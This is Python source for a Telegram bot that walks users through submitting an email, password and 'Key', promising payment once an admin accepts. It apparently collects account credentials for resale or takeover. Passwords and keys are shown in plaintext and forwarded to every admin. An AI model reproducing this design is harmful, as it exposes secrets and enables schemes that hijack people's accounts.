import re
import logging
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, ConversationHandler
from config import ADMIN_IDS
import database as db
from keyboards import cancel_keyboard, main_menu_keyboard, admin_submission_actions_keyboard

logger = logging.getLogger(__name__)

WAIT_EMAIL, WAIT_PASS, WAIT_KEY, WAIT_CONFIRM = range(4)

EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")

def key_help_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🆘 Need Help with Key? Contact @LALAJIIIIIIIIII", url="https://t.me/LALAJIIIIIIIIII")],
        [InlineKeyboardButton("🎥 Video Tutorial (Coming Soon)", url="https://t.me/LALAJIIIIIIIIII")]
    ])

def review_confirm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Confirm & Submit", callback_data="sub_confirm")],
        [
            InlineKeyboardButton("🔄 Start Over / Edit", callback_data="sub_restart"),
            InlineKeyboardButton("❌ Cancel", callback_data="sub_cancel")
        ]
    ])

async def start_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()

    # Step 1: Prompt for Email (Multiple submissions per user are fully allowed!)
    intro_text = (
        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n\n"
        "Please enter your email address:\n"
        "<i>(Note: Multiple submissions allowed. Resubmitting the same email requires an 8-hour cooldown.)</i>\n\n"
        "<i>Or press ❌ Cancel anytime to stop.</i>"
    )
    await update.message.reply_text(
        intro_text,
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_keyboard()
    )
    return WAIT_EMAIL

async def receive_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    if email == "❌ Cancel":
        context.user_data.clear()
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if not EMAIL_REGEX.match(email):
        await update.message.reply_text(
            "⚠️ <b>Invalid Email Format!</b>\n"
            "Please enter a valid email address (e.g. <code>user@example.com</code>):",
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
        return WAIT_EMAIL

    clean_email = email.lower()

    # Check for existing submission of this email
    existing = await db.get_submission_by_email(clean_email)
    if existing:
        can_resub, reason, rem_h, rem_m = db.check_resubmit_eligibility(existing)
        if reason == "ACCEPTED":
            await update.message.reply_text(
                f"🚫 <b>SUBMISSION REJECTED: ALREADY ACCEPTED</b>\n\n"
                f"The email <code>{clean_email}</code> has already been accepted and processed.\n\n"
                f"Accepted emails cannot be resubmitted.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            context.user_data.clear()
            return ConversationHandler.END

        if reason == "NOT_UNLOCKED":
            st = existing.get("status", "PENDING")
            await update.message.reply_text(
                f"🚫 <b>RESUBMISSION NOT PERMITTED</b>\n\n"
                f"The email <code>{clean_email}</code> is already in our records (Status: <b>{st}</b>).\n\n"
                f"⚠️ <b>Policy:</b> You cannot resubmit an email unless an admin explicitly unlocks it from their side.\n\n"
                f"If your submission was disapproved, please use the <b>⚖️ Submit Appeal</b> button to request a review.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            context.user_data.clear()
            return ConversationHandler.END

        if reason == "COOLDOWN_ACTIVE":
            unlocked_time = existing.get("resubmit_unlocked_at") or "recently"
            await update.message.reply_text(
                f"⏱️ <b>8-HOUR POST-UNLOCK COOLDOWN ACTIVE</b>\n\n"
                f"Admin approved resubmission for <code>{clean_email}</code> on {unlocked_time}.\n\n"
                f"However, resubmission is only allowed <b>8 hours after admin approval</b>.\n\n"
                f"⏳ <b>Time Remaining:</b> <b>{rem_h}h {rem_m}m</b>\n\n"
                f"Please wait until the cooldown expires before resubmitting.",
                parse_mode=ParseMode.HTML,
                reply_markup=main_menu_keyboard(is_admin)
            )
            context.user_data.clear()
            return ConversationHandler.END

        # Cooldown passed and admin unlocked!
        context.user_data["resubmitting_id"] = existing["id"]
        context.user_data["sub_email"] = clean_email
        await update.message.reply_text(
            f"🔄 <b>Resubmission Allowed:</b> <code>{clean_email}</code>\n"
            f"<i>(Admin approval confirmed & 8-hour cooldown has elapsed. Please enter your updated details.)</i>\n\n"
            f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
            f"Please enter your updated <b>PASS</b>:",
            parse_mode=ParseMode.HTML,
            reply_markup=cancel_keyboard()
        )
        return WAIT_PASS

    # Brand new email
    context.user_data["resubmitting_id"] = None
    context.user_data["sub_email"] = clean_email

    # Step 2: Ask for PASS
    await update.message.reply_text(
        f"✅ Email recorded: <code>{clean_email}</code>\n\n"
        f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
        f"Please enter your <b>PASS</b>:",
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_keyboard()
    )
    return WAIT_PASS

async def receive_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass_text = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    if pass_text == "❌ Cancel":
        context.user_data.clear()
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if len(pass_text) < 1 or len(pass_text) > 100:
        await update.message.reply_text(
            "⚠️ Please enter a valid PASS:",
            reply_markup=cancel_keyboard()
        )
        return WAIT_PASS

    context.user_data["sub_pass"] = pass_text

    # Step 3: Ask for Key + Help Button (@LALAJIIIIIIIIII) + Video tutorial placeholder
    await update.message.reply_text(
        f"✅ PASS recorded!\n\n"
        f"🔑 <b>Step 3 of 3: Enter Key</b>\n"
        f"Please enter your <b>Key</b>:\n\n"
        f"<i>💡 Need help with finding your Key? Tap the Help button below:</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=key_help_keyboard()
    )
    return WAIT_KEY

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_text = update.message.text.strip()
    is_admin = update.effective_user.id in ADMIN_IDS

    if key_text == "❌ Cancel":
        context.user_data.clear()
        await update.message.reply_text("Submission cancelled.", reply_markup=main_menu_keyboard(is_admin))
        return ConversationHandler.END

    if len(key_text) < 1 or len(key_text) > 100:
        await update.message.reply_text(
            "⚠️ Please enter a valid Key:",
            reply_markup=key_help_keyboard()
        )
        return WAIT_KEY

    context.user_data["sub_key"] = key_text

    email = context.user_data.get("sub_email")
    pass_code = context.user_data.get("sub_pass")
    key_code = key_text

    # Step 4: Show Review & Confirmation with Confirm, Start Over, or Cancel buttons
    review_card = (
        "📋 <b>Please Review Your Details Before Submitting:</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
        f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "<i>If you made a mistake, tap <b>🔄 Start Over / Edit</b> or <b>❌ Cancel</b>. "
        "If everything looks correct, tap <b>✅ Confirm & Submit</b>.</i>"
    )

    await update.message.reply_text(
        review_card,
        parse_mode=ParseMode.HTML,
        reply_markup=review_confirm_keyboard()
    )
    return WAIT_CONFIRM

async def sub_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    is_admin = user.id in ADMIN_IDS

    email = context.user_data.get("sub_email")
    pass_code = context.user_data.get("sub_pass")
    key_code = context.user_data.get("sub_key")

    if not email or not pass_code or not key_code:
        await query.edit_message_text(
            "⚠️ Session expired or missing details. Please click 📝 Submit Information to try again.",
            reply_markup=None
        )
        context.user_data.clear()
        return ConversationHandler.END

    resub_id = context.user_data.get("resubmitting_id")

    # Final duplicate email check before commit (exclude existing submission if resubmitting)
    is_dup = await db.is_email_registered(email, exclude_submission_id=resub_id)
    if is_dup:
        await query.edit_message_text(
            f"🚫 <b>Duplicate Email Detected:</b> <code>{email}</code> was already registered. Submission cancelled.",
            parse_mode=ParseMode.HTML
        )
        context.user_data.clear()
        return ConversationHandler.END

    # Save to database (update if resubmission, else create new)
    if resub_id:
        await db.update_submission_resubmit(resub_id, email, pass_code, key_code)
        submission_id = resub_id
    else:
        submission_id = await db.create_submission(
            user_id=user.id,
            username=user.username,
            email=email,
            pass_code=pass_code,
            key_code=key_code
        )
    submission_obj = await db.get_submission_by_id(submission_id)

    # Queue Calculation
    queue_info = await db.get_queue_info(submission_id)
    position = queue_info["position"]
    ahead_count = queue_info["ahead_count"]
    total_pending = queue_info["total_pending"]
    submitted_date = submission_obj["created_at"]
    resub_date = submission_obj.get("resubmitted_at") or submission_obj.get("updated_at")

    context.user_data.clear()

    # Success confirmation message to User
    if resub_id:
        user_confirm = (
            f"🔄 <b>Resubmission Received Successfully!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Resubmitted Date:</b> {resub_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔢 <b>Queue Information:</b>\n"
            f"• <b>Your Queue Position:</b> #{position}\n"
            f"• <b>Submissions Ahead of You:</b> {ahead_count} waiting for review\n"
            f"• <b>Total Pending Queue:</b> {total_pending}\n\n"
            f"⏳ <b>Current Status:</b> <b>Pending Review</b>\n\n"
            f"📢 <b>Next Steps:</b>\n"
            f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
            f"2. Once accepted, you will receive: <i>'status changed to accepted your payment will be made soon'</i>.\n"
            f"3. You can track your position anytime using the <b>📊 Check Status & Queue</b> button."
        )
    else:
        user_confirm = (
            f"🎉 <b>Submission Received Successfully!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Submitted Date:</b> {submitted_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔢 <b>Queue Information:</b>\n"
            f"• <b>Your Queue Position:</b> #{position}\n"
            f"• <b>Submissions Ahead of You:</b> {ahead_count} waiting for review\n"
            f"• <b>Total Pending Queue:</b> {total_pending}\n\n"
            f"⏳ <b>Current Status:</b> <b>Pending Review</b>\n\n"
            f"📢 <b>Next Steps:</b>\n"
            f"1. When an admin starts reviewing, your status will change to <b>In Review</b>.\n"
            f"2. Once accepted, you will receive: <i>'status changed to accepted your payment will be made soon'</i>.\n"
            f"3. You can track your position anytime using the <b>📊 Check Status & Queue</b> button."
        )
    await query.edit_message_text(
        user_confirm,
        parse_mode=ParseMode.HTML
    )

    await context.bot.send_message(
        chat_id=user.id,
        text="👇 Use the menu below to check your status or submit another:",
        reply_markup=main_menu_keyboard(is_admin)
    )

    # Alert to Admins
    if resub_id:
        admin_alert = (
            f"🔄 <b>Resubmitted Details Received!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id} (RESUBMITTED)\n"
            f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Resubmitted Date:</b> {resub_date}\n"
            f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
            f"📊 <b>Status:</b> ⏳ PENDING\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
    else:
        admin_alert = (
            f"🔔 <b>New Submission Received!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>Submission ID:</b> #{submission_id}\n"
            f"👤 <b>User:</b> @{user.username or 'NoUsername'} (ID: <code>{user.id}</code>)\n"
            f"📧 <b>Email:</b> <code>{email}</code>\n"
            f"🔒 <b>PASS:</b> <code>{pass_code}</code>\n"
            f"🔑 <b>Key:</b> <code>{key_code}</code>\n"
            f"📅 <b>Date:</b> {submitted_date}\n"
            f"🔢 <b>Queue Position:</b> #{position} (Total Pending: {total_pending})\n"
            f"📊 <b>Status:</b> ⏳ PENDING\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=admin_alert,
                parse_mode=ParseMode.HTML,
                reply_markup=admin_submission_actions_keyboard(submission_id, "PENDING")
            )
        except Exception as e:
            logger.error(f"Failed to notify admin {admin_id}: {e}")

    return ConversationHandler.END

async def sub_restart_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Starting over...")
    context.user_data.clear()

    await query.edit_message_text(
        "🔄 <b>Starting over.</b>\n\n"
        "📧 <b>Step 1 of 3: Enter Your Email Address</b>\n"
        "Please enter your email address:\n"
        "<i>(Note: Resubmitting the same email requires an 8-hour cooldown.)</i>",
        parse_mode=ParseMode.HTML
    )
    return WAIT_EMAIL

async def sub_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Cancelled.")
    context.user_data.clear()
    is_admin = update.effective_user.id in ADMIN_IDS

    await query.edit_message_text("❌ Submission cancelled.")
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text="Main menu:",
        reply_markup=main_menu_keyboard(is_admin)
    )
    return ConversationHandler.END

async def start_resubmission_from_appeal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    sub_id = int(query.data.split(":")[1])
    sub = await db.get_submission_by_id(sub_id)
    if not sub:
        await query.edit_message_text("⚠️ Submission not found.")
        return ConversationHandler.END

    can_resub, reason, rem_h, rem_m = db.check_resubmit_eligibility(sub)
    if not can_resub:
        await query.answer(f"⏱️ Cooldown active: {rem_h}h {rem_m}m remaining!", show_alert=True)
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["sub_email"] = sub["email"]
    context.user_data["resubmitting_id"] = sub["id"]

    await query.edit_message_text(
        f"🔄 <b>Resubmission Started for:</b> <code>{sub['email']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔒 <b>Step 2 of 3: Enter PASS</b>\n"
        f"Please enter your updated <b>PASS</b>:\n\n"
        f"<i>(Or send ❌ Cancel anytime)</i>",
        parse_mode=ParseMode.HTML
    )
    return WAIT_PASS
